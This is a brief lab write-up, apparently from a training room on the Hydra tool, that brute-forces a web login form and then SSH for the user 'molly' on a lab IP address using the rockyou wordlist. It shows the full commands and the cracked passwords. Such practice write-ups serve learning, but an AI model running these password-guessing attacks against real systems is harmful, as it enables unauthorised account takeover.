#Hydra


We need to bruteforce the web form using hydra. so lets do it.
-------------------------------------------------------------------
command: hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.142.52 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
-------------------------------------------------------------------


[80][http-post-form] host: 10.10.142.52   login: molly   password: sunshine                                                                     
We need to bruteforce the ssh for password.
--------------------------------------------------------------------
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.142.52 -t 4 ssh
--------------------------------------------------------------------
[DATA] attacking ssh://10.10.142.52:22/
[22][ssh] host: 10.10.142.52   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found


